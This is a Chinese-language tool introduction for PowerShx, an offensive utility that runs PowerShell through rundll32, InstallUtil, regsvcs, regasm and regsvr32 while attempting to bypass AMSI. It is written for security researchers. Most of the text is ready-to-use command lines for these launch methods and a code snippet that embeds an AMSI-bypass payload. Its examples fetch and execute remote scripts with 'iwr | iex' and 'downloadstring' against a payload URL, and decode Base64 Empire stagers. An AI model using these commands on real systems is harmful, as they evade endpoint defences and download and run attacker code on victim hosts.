![](https://image.3001.net/images/20211118/1637224346_61960f9a1fdf592154a4a.jpg!small)

## 关于PowerShx

PowerShx是一款功能强大的PowerShell软件，在该工具的帮助下，广大研究人员可以在目标主机上摆脱任何软件的限制从而执行PowerShell代码。

PowerShx是[
_PowerShdll_](https://github.com/p3nt4/PowerShdll)项目的一个扩展项目，并且提供了AMSI绕过和运行PS
Cmdlet的功能。

## 功能介绍

> 使用exe、installuitl.exe、regsvcs.exe、regasm.exe、regsvr*32.exe来运行PowerShel；
>
> 在不需要exe或powershell_ise.exe的情况下运行PowerShell；
>
> AMSI绕过功能；
>
> 直接通过命令行工具或PowerShell文件运行PowerShell脚本；
>
> 导入PowerShell模块和执行PowerShell Cmdlet；

## 工具依赖

> .Net 4

## 工具使用

### .dll版本

    
    
    rundll32
    rundll32 PowerShx.dll,main -e                           需要运行的PS脚本
    rundll32 PowerShx.dll,main -f <path>                    以参数形式传递和运行脚本
    rundll32 PowerShx.dll,main -f <path> -c <PS Cmdlet>    加载一个脚本并运行一个PS cmdlet
    rundll32 PowerShx.dll,main -w                    在一个新的窗口中开启一个交互式终端
    rundll32 PowerShx.dll,main -i                            开启一个交互式终端
    rundll32 PowerShx.dll,main -s                           尝试绕过AMSI
    rundll32 PowerShx.dll,main -v                        在终端中输出执行结果

### 替代选项

    
    
    x86 - C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U PowerShx.dll
        x64 - C:\Windows\Microsoft.NET\Framework64\v4.0.3031964\InstallUtil.exe /logfile= /LogToConsole=false /U PowerShx.dll
        x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe PowerShx.dll
        x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe PowerShx.dll
        x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U PowerShx.dll
        x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U PowerShx.dll
        regsvr*32 /s  /u PowerShx.dll -->Calls DllUnregisterServer
        regsvr*32 /s PowerShx.dll --> Calls DllRegisterServer

### .exe版本

    
    
    PowerShx.exe -i                          开启一个交互式终端
    PowerShx.exe -e                         需要运行的PS脚本
    PowerShx.exe -f <path>                  以参数形式传递和运行脚本
    PowerShx.exe -f <path> -c <PS Cmdlet>     加载一个脚本并运行一个PS cmdlet
    PowerShx.exe -s                         尝试绕过AMSI

### 嵌入Payload

广大研究人员可以通过更新“Common”项目中的“Common.Payloads.PayloadDict”数据目录来嵌入Payload，并在PsSession.cs
-> Handle()方法中调用Payload。下面的例子中演示了如何在Handle()方法中调用Payload：

    
    
    private void Handle(Options options)
    {
      // Pre-execution before user script
      _ps.Exe(Payloads.PayloadDict["amsi"]);
    }

## 工具使用样例

### 1、运行Base64编码的脚本

    
    
    rundll32 PowerShx.dll,main [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String("BASE64")) ^| iex
    PowerShx.exe -e [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String("BASE64")) ^| iex

注意：我们需要使用[System.Text.Encoding]::Unicode对Empire Stager进行解码。

### 2、运行Base64编码的脚本

    
    
    rundll32 PowerShx.dll,main . { iwr -useb https://website.com/Script.ps1 } ^| iex;
    PowerShx.exe -e "IEX ((new-object net.webclient).downloadstring('http://192.168.100/payload-http'))"

## 项目地址

 **PowerShx：** 【[ _GitHub传送门_](https://github.com/iomoath/PowerShx)】

## 参考资料

> [
> _https://github.com/p3nt4/PowerShdll_](https://github.com/p3nt4/PowerShdll)

